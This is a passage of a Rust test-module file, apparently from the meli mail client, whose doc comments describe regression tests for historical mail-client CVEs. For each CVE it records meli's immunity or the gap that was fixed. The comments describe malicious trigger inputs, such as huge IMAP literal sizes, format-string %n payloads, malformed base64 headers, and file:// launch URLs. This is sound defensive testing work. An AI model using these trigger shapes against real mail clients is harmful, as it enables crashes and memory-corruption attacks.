/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution family,
/// DoS face): processing a malicious mail corrupted the heap — the
/// zero-click sibling of CVE-2020-9818 (#31) on the memory-exhaustion
/// face, where a tiny message with giant *declared* sizes exhausts the
/// heap of a client that trusts declarations over arrived bytes. meli
/// links no proprietary mail engine, so the equivalent surface is the
/// issue-prescribed allocation strategy of `melib/src/email/parser.rs`
/// plus the receive paths, and the invariant — every allocation rides
/// bytes that actually arrived, declaration/content mismatch fails
/// closed — reads in meli's zero-copy nom model as immune by
/// construction. [`cve_2020_9819`] locks that layer by layer with the
/// prescribed deceptive-declaration corpus — MIME parts declaring
/// `usize::MAX`/TiB `Content-Length` and `message/external-body`
/// `size=` values over tiny actual bodies (footprint is a function of
/// actual bytes only; same-digit-count declarations `10^19` apart cost
/// byte-identically), a twenty-thousand-header in-part declaration
/// storm and an 8192-minimal-part explosion with the zero-object
/// empty delimiter mass (object count and retained bytes ride the
/// actual delimiters), the IMAP zero-click FETCH batch failing
/// closed on every literal declaration/content mismatch, and the
/// `Connection::MAX_SERVER_RESPONSE_SIZE`/`IO_BUF_SIZE` heap backstop
/// staying finite — and the result is **immune, no gap found**: no
/// production code needed changing. The corpus is disjoint from #27
/// (declared-size *arithmetic*), #30 (header *width* amplification
/// with real MB content) and #31 (malformed-bytes *panic/OOB* safety).
#[cfg(test)]
#[path = "CVE-2020-9819.rs"]
mod cve_2020_9819;

/// CVE-2008-0039 (Apple Mail, Mac OS X 10.4.11 / Server 10.4.11,
/// CVSS v2 6.8) file-URL application-launch RCE regression (issue
/// #33, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution): APPLE-SA-2008-02-11 — 「An implementation issue exists
/// in Mail's handling of file:// URLs, which may allow arbitrary
/// applications to be launched without warning when a user clicks a
/// URL in a message」, fixed upstream by revealing the location in
/// Finder instead of launching (CWE-94). meli links no Launch
/// Services, Finder integration or AppleScript bridge, so the issue's
/// prescribed equivalent surface — the `meli/src/mail/view.rs` link
/// scheme whitelist, every place a mail-borne URL spelling can reach
/// an OS url launcher — is mapped and locked as an immunity proof on
/// the whole local-executable family (`.app` bundles, `.command`,
/// `.scpt`, `.sh`, directory, query, fragment, percent-encoded, any
/// casing, `file://localhost/…` and `file:///…`): [`cve_2008_0039`]
/// proves the `go_to_url` gate refuses every `file:` spelling behind
/// an explicit per-URL confirmation (on top of the deliberate
/// URL-mode keystroke sequence a terminal client already requires —
/// stronger than Apple's own fix), URL-mode extraction never yields a
/// launchable `file:` URL (the single-slash and backslash spellings
/// are not extracted at all — the issue's 「仅以纯文本显示，不可打开」),
/// the HTML mirror's `file:` hrefs die in `sanitize` casing and
/// percent-encoding included, the header-derived launch sites
/// (`List-Unsubscribe`/`List-Archive`) skip `file:` targets, and an
/// honest carrier keeps its `https`/`mailto` links one-keystroke
/// usable everywhere the family is refused. No gap was exposed on
/// this corpus; no production code needed changing.
#[cfg(test)]
#[path = "CVE-2008-0039.rs"]
mod cve_2008_0039;

/// CVE-2026-84641 (Thunderbird < 155, ESR < 140.15, 153.x < 153.2,
/// MFSA 2026-86/87/88, CVSS 7.5) IMAP `ID` response use-after-free →
/// heap-leak regression (issue #36, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malicious IMAP server answered the `ID` command (RFC 2971) with
/// a crafted parameter list that triggered a use-after-free in
/// Thunderbird's C++ parser and leaked heap memory — content that
/// could then be persisted into prefs.js. [`cve_2026_84641`] locks
/// meli's equivalent surface (`melib/src/imap/protocol_parser/
/// id_ext.rs` plus the response-assembly, log and `server_id`
/// persistence sites) with the issue-prescribed hostile corpus
/// (overlong keys/values, illegal UTF-8, unclosed parens, binary
/// garbage) and proves the memory-safety class immune — safe
/// checked Rust, every shape a deterministic typed error, illegal
/// UTF-8 rendered as a fixed placeholder, and the `prefs.js`-face
/// persistence (`serde_json::to_value`) holding only
/// `String::from_utf8`-validated ≤ 1024-octet text from a
/// zero-initialized read buffer — while exposing one real gap,
/// fixed with this regression: RFC 2971's `#(string SPACE nstring)`
/// allows *zero* pairs, but the parser demanded one, answering the
/// legal 「no information」 `* ID ()` form with a parse error and a
/// spurious "Consider turning ID use off" warning on every connect;
/// it now answers `Ok(None)`, regression-locked in
/// `melib/src/imap/protocol_parser/id_ext.rs` together with the
/// corpus here.
#[cfg(test)]
#[path = "CVE-2026-84641.rs"]
mod cve_2026_84641;

/// CVE-2026-14899 (Thunderbird < 153, ESR < 140.13; MFSA / OpenCVE,
/// CVSS 7.5) MIME-header off-by-one regression (issue #35, table 2
/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution):
/// forwarding a mail with 「显示全部头」 enabled hit an off-by-one
/// in MIME header parsing that read one byte past the end of the
/// buffer, potentially crashing the client. meli links no
/// Gecko/XPCOM MIME parser, so the equivalent surface the issue
/// prescribes is the header parsing boundary itself —
/// `melib/src/email/headers` plus the `headers` module of
/// `melib/src/email/parser.rs` and their
/// 「receive → parse → display → forward」 consumers — driven by the
/// corpus family of header **name**, **value** and
/// **folding-whitespace** lengths at parsing-boundary values ±1
/// byte. [`cve_2026_14899`] locks that layer by layer — the corpus
/// parses panic-free with byte-precise slices, the exact
/// `(name, value, rest)` bytes of every canonical boundary shape
/// are asserted, the CVE's trigger (header iteration with all
/// headers shown + the forward/reply composers) is mapped immune —
/// and exposes one real gap, fixed with this regression:
/// `HeaderName::from_bytes` accepted the **empty** byte slice and
/// returned an empty header name, the length-0 boundary one below
/// the grammar's `field-name = 1*ftext` minimum of 1 (this CVE's
/// own ±1 class): an empty name could become a `HeaderMap` key and
/// a `": value"` malformed line through the composer's
/// `Draft::set_header`. The fix rejects the empty input at
/// `from_bytes` (every `TryFrom` spelling and serde route through
/// it), regression-locked in
/// `melib/src/email/headers/tests.rs::
/// test_email_headers_names_empty_name_is_invalid` together with
/// the corpus here.
#[cfg(test)]
#[path = "CVE-2026-14899.rs"]
mod cve_2026_14899;

/// CVE-2026-84640 (Thunderbird; MFSA 2026-86/87/88, same advisory
/// batch as CVE-2026-84641) mail-header one-byte out-of-bounds
/// read regression (issue #38, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// maliciously constructed mail header made Thunderbird's parser
/// read one byte past the end of its header buffer. meli links no
/// Gecko/XPCOM header parser, so the equivalent surface the issue
/// prescribes is the header parsing boundary itself —
/// `melib/src/email/headers` plus the `headers` module of
/// `melib/src/email/parser.rs` and their 「receive → parse →
/// display」 consumers — driven by the issue's prescribed corpus
/// family: header byte sequences whose length sits exactly on a
/// parsing boundary — the empty value, the single-byte value, the
/// no-colon line and the input without a trailing newline.
/// [`cve_2026_84640`] locks the class layer by layer — no-colon
/// lines reject at the `field-name` scan guards, empty and
/// single-byte values cut exact byte slices with their one-past
/// neighbours rejecting, the exhaustive truncation sweep (every
/// prefix of canonical LF/CRLF/multipart mails) proves no parser
/// position consults the byte one past the buffer end, and the
/// receive → parse → display pipeline over a mail whose every
/// header sits on a boundary stays inert and byte-faithful. On
/// this corpus meli holds by construction — checked slicing leaves
/// the one-past read nowhere to land — so the class is locked
/// immune without needing a `melib` fix.
#[cfg(test)]
#[path = "CVE-2026-84640.rs"]
mod cve_2026_84640;

/// CVE-2026-84639 (Thunderbird, fixed in the MFSA 2026-86/87/88
/// batch, no CVSS score assigned) uninitialized-memory-use
/// regression (issue #37, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// specific MIME body triggered an error path in Thunderbird's MIME
/// processing that used uninitialized memory (CWE-457), surfacing
/// never-written buffer contents. meli's whole e-mail decode path is
/// safe Rust (no `MaybeUninit`, no `set_len`), so the literal site
/// cannot exist — [`cve_2026_84639`] locks the issue-prescribed
/// equivalent surface, the MIME error paths of
/// `melib/src/email/parser.rs` + `Attachment::decode`, with the
/// prescribed corpus (truncated base64, bad quoted-printable,
/// illegal byte sequences): every error path echoes its input
/// verbatim or applies a fixed decode table / the fixed U+FFFD
/// replacement sequence — byte-exact snapshots, identical across two
/// independent parses and two decodes each, bounded by the proven
/// expansion factor; the error messages are exact static strings;
/// and a kitchen-sink mail combining every family is deterministic
/// end to end through envelope, MIME tree, decode, text extraction,
/// `Display`/`Debug` and every `ViewOptions` conversion mode — with
/// an honest carrier proving the decoder does its real work. The
/// result is **immune, no gap found**: no production code needed
/// changing.
#[cfg(test)]
#[path = "CVE-2026-84639.rs"]
mod cve_2026_84639;

/// CVE-2001-0473 (mutt < 1.2.5, no CVSS score assigned) IMAP
/// format-string remote-code-execution regression (issue #40, table
/// 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution):
/// a malicious IMAP server answered commands with response text
/// carrying printf format-string metacharacters, and mutt passed
/// that text to a printf-style error reporter *as the format
/// string* — `%s`/`%x` walked the stack, `%n` wrote attacker-chosen
/// pointers into it, and arbitrary commands executed (CWE-134).
/// [`cve_2001_0473`] maps the attack onto meli's
/// issue-prescribed equivalent surface — `melib/src/imap` response
/// text flowing into `melib/src/error` values, log records and
/// display — and locks it layer by layer as an immunity proof:
/// response text parses into `ResponseCode::Alert` byte-preserved
/// (metacharacter inventory constant, `%%` never collapsed, width
/// bombs never expanded, NUL/illegal-UTF-8 degraded only by the
/// fixed lossy decoder, Dovecot timing-suffix strips keep the
/// payload), and every downstream sink — the
/// `From<ImapResponse>` error embedding, the `BackendEvent::Notice`
/// and state.rs status format, the `imap_log!`/`tracing` log faces,
/// the BYE 「Offline」 face and the `Error` display chain — carries
/// the payload as a *value* argument of a compile-time literal
/// template; display is proven idempotent (no hop secondarily
/// formats), the `{`-family rides the framing as IMAP literal
/// *declarations* (lengths, never formats) that degrade to the
/// payload verbatim, untagged injections stay raw bytes, and the
/// whole corpus flows panic-free and deterministically. In Rust the
/// mutt primitive is inexpressible — no varargs, and
/// `format!`/`write!`/`tracing` accept no runtime format template —
/// so no gap exists to fix: no production code needed changing.
#[cfg(test)]
#[path = "CVE-2001-0473.rs"]
mod cve_2001_0473;

/// CVE-2014-8878（KMail；CVSS 5.9）「自动加密」偏好未覆盖附件回归（issue #120）：
/// KMail 启用「自动加密」后只加密正文，附件仍以明文上线，网络嗅探者无需密钥
/// 即可读走附件。melib 侧的等价攻击面在发送路径：`Draft::finalise` 把正文与全部
/// 附件组装成**同一棵** `multipart/mixed`，`send_draft_async`
///（`meli/src/mail/compose.rs` 3220–3250 行）再把这整棵树交给
/// `meli/src/mail/pgp.rs` 的 `encrypt_filter`——meli 没有「只加密正文」的分叉，
/// 手动/自动加密一旦生效，正文与附件共享同一个 PGP/MIME 密文载荷，故对 CVE 的
/// 直接原语免疫。语料是一次性 OpenPGP 密钥（ed25519 主钥 + cv25519 加密子钥）
/// 与三个 SECRET 标记（正文 + 八位字节附件 + text/plain 附件）。三层断言：
/// L1 无 gpg 的结构层锁定 finalise 产出的单一 3 部件 mixed 树；L2 真实 gpgme
/// 端到端——(a) 嗅探者视角：外发报文原始字节与所有部件解码字节都不含任何标记、
/// 顶层无原附件内容类型/文件名，(b) 还原视角：解密字节逐字节等于加密前的 mixed
/// 树且两附件解码回原始字节；L3 fail-closed：无可用加密钥时报
/// `"No key was selected for encryption"` 中止发送。另如实记录 meli 侧等价缺口
/// `pgp.auto_encrypt` 从未被 composer 消费——已由并行任务修复（composer 首次
/// draw 时播种 `encrypt_mail`），回归见 `meli/src/mail/compose.rs` 的
/// `auto_encrypt_setting_arms_composer_encryption`、
/// `auto_encrypt_defaults_leave_composer_unarmed`、
/// `manual_encrypt_choice_is_not_overridden_by_default_setting` 三个单测。
#[cfg(test)]
#[path = "CVE-2014-8878.rs"]
mod cve_2014_8878;

/// CVE-2017-9604（KMail/messagelib < 5.5.2；CVSS v3 7.5，CWE-311）「Send
/// Later」延时发送未执行 composer 插件签名/加密动作回归（issue #121）：用户
/// 以为邮件已签名/加密，实际明文上线，网络嗅探者可读走。修复提交
/// kmail@78c5552 / messagelib@c54706e。经全仓确认 meli/melib **没有**
/// Send Later/发件箱/scheduler/延时发送设置；composer 只有
/// `start_send_confirmation` 一个用户发送入口，确认后调用
/// `send_draft_async`，后者在**同一函数体内**统一读取
/// `pgp_state.sign_mail`/`encrypt_mail` 构建 `sign_filter`/`encrypt_filter`
/// 过滤栈，唯一另一个调用点（list-unsubscribe mailto）同样把
/// `GpgComposeState` 传进同一汇点——不存在「另一条发送路径忘记消费 PGP
/// 标志」的分叉。唯一「延时」原语 JMAP `EmailSubmission.sendAt` 是服务端占用
/// 字段（`#[serde(skip_serializing)]`）且提交发生在密文成型之后。三层断言：
/// L1 攻击样本明文泄露形态 + `GpgComposeState::Default` 全 unarmed + 源码扫描
/// 无独立延时队列原语/单一定义单汇点 + JMAP 提交对象不含 `sendAt`；L2 真实
/// gpgme 端到端——armed 时 `sign_filter` 产出真实 `multipart/signed`、
/// sign+encrypt 时 `encrypt_filter` 产出 `multipart/encrypted`，嗅探者视角外发
/// 报文与所有部件解码字节都不含 SECRET 标记，解密后重新解析回原 mixed 树；
/// L3 fail-closed：空钥路径分别以 `"No key was selected for encryption"` /
/// `"No key was selected for signing"` 中止，绝不退回明文。结论：**未发现
/// 缺口**，meli 对 CVE-2017-9604 的攻击原语免疫；composer 层完整 fail-closed
/// 行为另由 `meli/src/mail/compose.rs` 的单测
/// `send_setup_failure_never_spawns_a_submission_job` 锁定。
#[cfg(test)]
#[path = "CVE-2017-9604.rs"]
mod cve_2017_9604;

/// CVE-2014-9116 (mutt 1.5.23, CVSS v2 5.0) header-processing
/// heap-overflow regression (issue #41, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): mutt's
/// `write_one_header` mishandled newline characters at the beginning
/// of a header, and 「a header with an empty body」 — the verbatim
/// trigger is an mbox mail whose header section is `From:\n` followed
/// by a bare-CR line — made `mutt_substrdup` receive a `begin` one
/// past its `end` at write-out time; the wrapped `-1` became
/// `SIZE_MAX`, and `memcpy` into the zero-size block overflowed the
/// heap (crash/DoS). [`cve_2014_9116`] maps the attack onto meli's
/// issue-prescribed equivalent surface — the 头区/正文边界 handling of
/// `melib/src/email/parser` — drives it with the trigger families
/// (the openwall PoC, 「空头」 empty-header-section mails in every
/// separator spelling, empty-body headers, bare-CR lines, separator
/// truncations) and locks the walls layer by layer, exposing two real
/// gaps, both fixed with this regression in
/// `melib/src/email/parser.rs`: `parser::mail`'s `many1` header list
/// rejected RFC 5322-valid 「空头」 mails outright — and since the
/// maildir receive path silently skips envelopes that fail
/// `Envelope::from_bytes`, such mails were invisible (this CVE's
/// availability face, one crash-proofed refusal away from mutt's
/// 「开头换行符处理不当」); and `headers_raw` — the `mutt_substrdup`
/// analogue — mis-cut both separator spellings: the CRLF form
/// truncated the last header line's terminator so `HeaderIterator`
/// dropped the header (an identical CRLF multipart mail lost its
/// `has_attachments` listing indicator), both spellings leaked the
/// empty line's bytes into the body, and the mixed spellings did not
/// split at all. The exact PoC mail itself fails closed — meli's
/// strict field-name grammar rejects its colon-less bare-CR line (the
/// CVE-2026-84640-locked class), so no header list and no write-out
/// exist to crash on — while every parseable corpus mail proves inert
/// through receive, display list, reply composer and mbox export.
#[cfg(test)]
#[path = "CVE-2014-9116.rs"]
mod cve_2014_9116;

/// CVE-1999-0940 (mutt, early versions, no CVSS assigned) MIME-parsing
/// buffer-overflow regression (issue #39, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malformed MIME mail overflowed a fixed buffer in mutt's MIME parser
/// and executed attacker commands — one of the earliest e-mail-client
/// overflow CVEs. meli's parser is checked Rust with no fixed-size
/// buffers, so [`cve_1999_0940`] locks the issue-prescribed corpus
/// family (boundary 缺失/重复, 部分头缺失, 坏 base64 边界, plus oversized
/// MIME tokens as the anti-mutt layer) as deterministic degradation
/// and bounded, byte-faithful parsing — and exposes two real gaps
/// behind the canonical RFC 5322 `CRLF` line ending, fixed with this
/// regression: the multipart twin scanners (`multipart_parts`/
/// `parts_f`) treated `\r\n` and `\n` delimiter terminators
/// asymmetrically, so `Envelope::has_attachments` (the 📎 listing
/// indicator, fed by `check_if_has_attachments_quick`) missed every
/// attachment living outside the first part of a CRLF mail and a
/// CRLF mail ending at its last non-closing delimiter lost all
/// already-scanned parts; and `headers_raw` returned the header
/// block of a CRLF part ending in a bare `\r` no `header_value()`
/// can terminate, silently dropping the part's last header — in
/// practice the `Content-Disposition` of the attachment part. Both
/// fixed in `melib/src/email/parser.rs`, regression-locked in
/// `melib/src/email/parser/tests.rs` together with the corpus here.
#[cfg(test)]
#[path = "CVE-1999-0940.rs"]
mod cve_1999_0940;

/// CVE-2023-4874 (mutt > 1.5.2, < 2.2.12, CVSS 4.3) NULL-pointer
/// dereference DoS regression (issue #43, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): mutt
/// crashed when *viewing* a specially crafted mail whose structural
/// fields are missing (the drafting twin of the same advisory is
/// CVE-2023-4875). meli's memory model has no NULL to dereference —
/// a missing `From` is an empty `SmallVec`, a missing `Message-ID`
/// an allocated-but-empty `MessageID`, a missing `Subject` an empty
/// `Cow`, a missing `Date` the epoch timestamp — so
/// [`cve_2023_4874`] locks the issue-prescribed corpus family (无
/// Message-ID、无 From、空 body、无 Content-Type, down to the
/// zero-byte mail and the void-value `From: `/`Message-ID: `
/// spellings) as panic-free 「receive → parse → display」 with every
/// gap degrading to its documented default (an absent or void
/// Message-ID is synthesized from the envelope hash — the allocated
/// identifier mutt's `NULL` pointer never had; the absent
/// Content-Type degrades to the RFC 2045 `text/plain`). The full `EnvelopeView` rendering
/// (constructor display build, `draw` at real and degenerate
/// terminal sizes, sticky-header walk) is locked in
/// `meli/src/mail/view/tests.rs`
/// (`missing_structural_fields_mail_renders_degraded_in_envelope_view`)
/// — the view constructors need a `MainLoopHandler` from a mock
/// context, which this crate deliberately does not add as a
/// test-only dependency (same split as CVE-2024-21378).
#[cfg(test)]
#[path = "CVE-2023-4874.rs"]
mod cve_2023_4874;

/// CVE-2002-0833 (Eudora 5.1.1 / 5.0-J, Windows; no CVSS score
/// assigned) MIME boundary buffer-overflow regression (issue #45,
/// table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution): a multipart mail whose overlong `boundary=` parameter
/// overflowed Eudora's fixed-size MIME buffer and executed attacker
/// code. meli has no fixed-size buffer anywhere on the boundary path,
/// so [`cve_2002_0833`] locks the issue-prescribed corpus family —
/// overlong boundaries (>10 KB up to 1 MiB), quoted-string parameter
/// forms, control bytes inside the quoted boundary and
/// linear-whitespace runs — as bounded, byte-faithful, panic-free
/// parsing, and exposes two real gaps behind the 超长空白 face, both
/// fixed with this regression: RFC 2046 §5.1.1 allows a boundary
/// delimiter line to carry optional linear whitespace before its line
/// ending (`"--" boundary *LWSP CRLF`), but both twin scanners treated
/// a `--BOUND   <CRLF>` delimiter as a false boundary occurrence — a
/// whitespace-carrying first delimiter skipped the whole first part
/// and a mid delimiter ended the scan, silently dropping every part
/// after it (the 📎 listing indicator with it) on a legitimate,
/// RFC-valid mail; and the boundary *parameter value* grammar
/// (`bcharsnospace` ending) says trailing SP/HTAB is line junk, not
/// boundary bytes, but all three extraction sites kept the verbatim
/// value, so `boundary=BOUND   ` with honest `--BOUND` delimiters
/// parsed to zero parts. Fixed in `melib/src/email/parser.rs`
/// (`skip_lwsp` delimiter tolerance in both twin loops) and
/// `parser::attachments::multipart_boundary` (the shared normalized
/// extraction), regression-locked in
/// `melib/src/email/parser/tests.rs` together with the corpus here.
#[cfg(test)]
#[path = "CVE-2002-0833.rs"]
mod cve_2002_0833;

/// CVE-2022-1328 (mutt ≥ 0.94.13, < 2.2.3, CVSS 4.3, Tavis Ormandy
/// / Google Project Zero) uudecode out-of-bounds-read regression
/// (issue #42, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// virus / code execution): a mail carried a uuencoded attachment
/// (`begin 644 name` … `end`) whose data line declared more decoded
/// bytes than the physical line held, and mutt's uudecode kept
/// consuming characters per the declaration — past the end of the
/// line into adjacent memory (CWE-125), surfacing the over-read
/// bytes in the decoded attachment. [`cve_2022_1328`] maps the
/// attack onto meli's issue-prescribed equivalent surface
/// (`melib/src/email/attachments.rs`: attachment type recognition
/// and decoding) and locks it layer by layer as an immunity proof:
/// the corpus is a genuine uuencode of a secret payload (verified by
/// an embedded bounded reference uudecode carrying the mutt 2.2.3
/// semantics — the declaration never licenses reading past the
/// actual span), every issue-prescribed malformation family
/// (「行尾无换行 / 截断 / 超长行 / 非法字符」) is exactly a
/// declared-vs-actual mismatch the bounded decoder refuses, and meli
/// never auto-uudecodes anything: the trigger header maps to
/// `ContentTransferEncoding::Other`'s verbatim passthrough of the
/// bytes that actually arrived, inline uuencoded text renders as
/// plain text through the ordinary `InlineText` branch, the secret
/// never surfaces in any decode/text/display surface, an exhaustive
/// truncation sweep proves decode output is exactly the actual bytes
/// at every cut — never longer, never past the (missing) line end —
/// the `begin` line's traversal name stays text and never migrates
/// into filename metadata, and the kitchen-sink mail (double
/// base64-wrapped uuencode included) parses deterministic and
/// panic-free end to end. meli has no uuencode decoder at all, so
/// no gap exists to fix: no production code needed changing.
#[cfg(test)]
#[path = "CVE-2022-1328.rs"]
mod cve_2022_1328;

/// CVE-2023-4875 (mutt >1.5.2, <2.2.12, CVSS v2 4.3) NULL-dereference
/// draft-composition regression (issue #44, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): mutt
/// stored a draft's user headers after checking only that each field
/// "contains at least a colon", then handed the *entire* field to its
/// rfc2047 decoder and `safe_strdup`'d the result; the decoder's
/// base64 path skipped illegal characters instead of aborting, so
/// `=?utf-8?B?####?=` decoded to an empty string, the empty strdup
/// landed as a NULL `userhdrs` entry, and the compose write-out
/// crashed in `strchr(NULL, ':')` — composing from a specially
/// crafted draft message. [`cve_2023_4875`] maps the attack onto the
/// issue-prescribed 「从草稿继续撰写」 surface — draft load
/// (`Draft::from_str`), editor reload (`Draft::update`), draft re-open
/// (`Draft::edit`) and re-serialisation (`to_edit_string`,
/// `finalise`) — drives the mutt trigger family (RFC 2047 words of
/// illegal, empty and mixed base64 payloads, illegal Q-escapes,
/// unknown charsets, folds, the words planted in the standard
/// headers) plus the 坏头/坏 MIME 结构/缺失必填字段 families and every
/// byte-truncation of the canonical trigger draft, and locks the
/// walls layer by layer: the illegal-base64 decode *aborts* in meli's
/// `data_encoding` alphabet check (mutt's root fix) with the payload
/// kept as literal text; the compose path never decodes custom header
/// values at all, so the trigger words survive load → editor
/// round-trip → `finalise` byte-identical and the emptied-to-NULL
/// producer has no code to run in; malformed headers fail closed as
/// deterministic `ValueError`s; hostile MIME (150-level multiparts
/// past the 100-level cap, unclosed/empty/missing boundaries,
/// 500-level `message/rfc822` nests, garbage base64/QP bodies) stays
/// bounded; missing required fields default instead of crashing. One
/// real gap is exposed and fixed with this regression in
/// `melib/src/email/compose.rs`: `Draft::edit` swallowed any
/// `Envelope::headers` failure with `unwrap_or_else(|_| Vec::new())`
/// — one hostile non-UTF-8 header value silently wiped **every**
/// header (To/Subject/From gone) when a stored draft was resumed, the
/// silent data-loss neighbour of this CVE's availability face; it now
/// parses the header block with the exact grammar and verdicts of
/// `Draft::from_str` (`parser::mail` plus per-value UTF-8 conversion),
/// so the re-open entry reports the unparseable field as a
/// deterministic `ValueError` the composer surfaces as its "Failed to
/// open e-mail" notification, while RFC 5322-valid zero-header 「空头」
/// drafts keep loading with the default fields.
#[cfg(test)]
#[path = "CVE-2023-4875.rs"]
mod cve_2023_4875;

/// CVE-2003-0376 (Eudora 5.2.1, CVSS v2 5.0) "Attachment Converted"
/// buffer-overflow regression (issue #47, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): Eudora
/// parsed the `Attachment Converted` line of a received mail and
/// copied its dot-piled quoted argument (`\B.A.A.A … .A.A.A`, 122
/// repetitions of `.A`) into a fixed-size buffer — crash with
/// `ACCESS_VIOLATION`, failed restart until the message was removed,
/// possibly controllable code execution. [`cve_2003_0376`] maps the
/// attack onto meli's equivalent surfaces — the marker line, the
/// MIME attachment filename, the mailcap `%s` temp landing and the
/// save-component sinks — over the verbatim bugtraq trigger shapes
/// (canonical `a…………exe`, `\B.A.A…` below/at/above the 122-repetition
/// crash threshold, all-dot and RFC 2047-armored piles, megabyte
/// names) and locks the walls layer by layer: the marker line is
/// inert body text (and its header spellings fail closed), dot piles
/// parse/surface/display verbatim and bounded, executable content
/// never auto-materializes (temp root untouched by reading) nor lands
/// with an execute bit, and opening stays gated on the explicit
/// `open_mailcap` shortcut. One real gap is exposed and fixed with
/// this regression in `meli/src/types/helpers.rs`: `File::
/// create_temp_file` left its sanitized name hint arbitrarily long,
/// so a name past `NAME_MAX` fell into the per-grapheme
/// `ENAMETOOLONG` retry loop — O(len²) work (measured: ≈109 s for a
/// 100 000-byte name in a release build), one hostile mail freezing
/// the client for minutes on the first mailcap open, the availability
/// face of this CVE; every mail-controlled name sink now
/// pre-truncates to a bounded component on a UTF-8 character boundary
/// while the per-grapheme fallback stays for exotic filesystems.
#[cfg(test)]
#[path = "CVE-2003-0376.rs"]
mod cve_2003_0376;

/// CVE-2003-0300 (Sylpheed 0.8.11, CVSS v2 5.0, CWE-190) IMAP literal
/// integer signedness/overflow regression (issue #138, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malicious IMAP server answered with a huge literal size declaration
/// (`{18446744073709551615}`, `{4294967295}`, `{-1}` …); the client
/// parsed the declared octet count into a signed/narrow integer, so the
/// sign error or overflow crashed the client. NVD records the same
/// class against Outlook Express, mutt and others; Sylpheed 0.8.11 is
/// the named client, and the row is the Sylpheed twin of Eudora's
/// CVE-2003-0302 below. [`cve_2003_0300`] locks the equivalent surface
/// the issue prescribes (`melib/src/imap/protocol_parser.rs`:
/// [`literal`], the string/astring token grammar, the ENVELOPE field
/// parsers' literal guard, the `fetch_response()` carriers and the line
/// splitter's saturating skip) on the issue's verbatim corpus —
/// `{18446744073709551615}` (usize::MAX at the declaration position),
/// `{4294967295}` (the 32-bit boundary), `{-1}` (the sign spelling),
/// `{99999999999999999999}` (twenty digits past usize::MAX) and `{123`
/// (unterminated) — with the honest `{3}`/`{0}` literals still
/// round-tripping as the carriers. The result is **immune, no gap
/// found**: `usize::from_str` plus nom's checked `length_data` refuse
/// the values before any arithmetic on the declared size, and the one
/// arithmetic site (the line splitter's continuation skip) saturates
/// via issue #27's `saturating_add` — a declared number never wraps,
/// never panics and never steers the cursor back into the buffer; no
/// production code needed changing.
#[cfg(test)]
#[path = "CVE-2003-0300.rs"]
mod cve_2003_0300;

/// CVE-2003-0302 (Eudora 5.2.1, no CVSS score assigned) IMAP
/// literal integer-overflow regression (issue #46, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malicious IMAP server returned a huge literal size declaration
/// (`{4294967295}` and friends); Eudora parsed the declared octet
/// count into a signed 32-bit integer, and the sign/overflow error
/// crashed the client or possibly executed attacker code (the
/// signedness face of CWE-190). meli's IMAP literal path is
/// unsigned-checked Rust throughout — `digit1` grammar +
/// `usize::from_str` + nom's checked `take`, with no signed or
/// narrowing cast anywhere a declared size flows — so the
/// equivalent surface the issue prescribes
/// (`melib/src/imap/protocol_parser.rs`: [`literal`], the
/// string/astring token grammar, the ENVELOPE field parsers' literal
/// guard, the `fetch_response()` carriers and the line splitter's
/// saturating skip) is locked by [`cve_2003_0302`] on the issue's
/// verbatim corpus — `{4294967295}` and `{-1}` (the same
/// 0xFFFFFFFF bit pattern in its two spellings), the `2^16`/`2^31`/
/// `2^32` type boundaries, the 非数字 grammar class (`{abc}`, `{ 5}`,
/// `{5+}`, `{5}\n` …) and the 与实际数据不符 mismatch class — with
/// the honest literals still round-tripping as the carriers. The
/// result is **immune, no gap found**: the walls are issue #27's
/// saturating line-skip arithmetic, #31's framing cursor clamps and
/// #32's fail-closed mismatch policy, re-locked at this CVE's own
/// sign/grammar/mismatch corpus — a declared number saturates,
/// never wraps, never panics; no production code needed changing.
#[cfg(test)]
#[path = "CVE-2003-0302.rs"]
mod cve_2003_0302;

/// CVE-2007-3166 (Qualcomm Eudora 7.1.0.9, no CVSS score assigned)
/// IMAP FLAGS response buffer-overflow regression (issue #49,
/// table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution): a malicious IMAP server answered with an over-long
/// FLAGS response — a single flag atom past the client's fixed
/// buffer, or an explosion of flag tokens — and the copy into the
/// fixed-size buffer overflowed (CWE-120; user interaction
/// required). [`cve_2007_3166`] maps the attack onto the
/// issue-prescribed FLAGS 应答 face (`melib/src/imap/
/// protocol_parser.rs`: the [`flags`] list parser, its FETCH /
/// untagged / UID-FETCH-FLAGS / SELECT `* FLAGS (` and
/// `PERMANENTFLAGS` carriers, and the `split_rn` framing below them
/// all) and locks it layer by layer on the verbatim corpus — 单个
/// flag 超长 (1 KiB era-scale, 1 MiB, one byte past
/// `Connection::MAX_SERVER_RESPONSE_SIZE` — no fixed-size buffer
/// exists at any length) and 数量爆炸 (1 024 / 65 536 / 524 288
/// one-byte keywords, retained memory inside a documented 32×
/// response-byte bound) — and exposes one real gap, fixed with this
/// regression in `ImapLineIterator::next`: the literal-declaration
/// probe re-ran `find(CRLF)` over the line tail once per failing
/// `{` candidate, so a `{`-dense over-long FLAGS line framed in
/// O(N²) before any parser ran (measured ≈8 s at 32 KiB debug; the
/// transport cap admits 64 MiB lines) — one hostile response
/// hanging the watch/select/read loops of every IMAP account
/// (CWE-407, the availability twin of this CVE's overflow, the
/// same class issue #24 closed in `phrase()`). The probe now walks
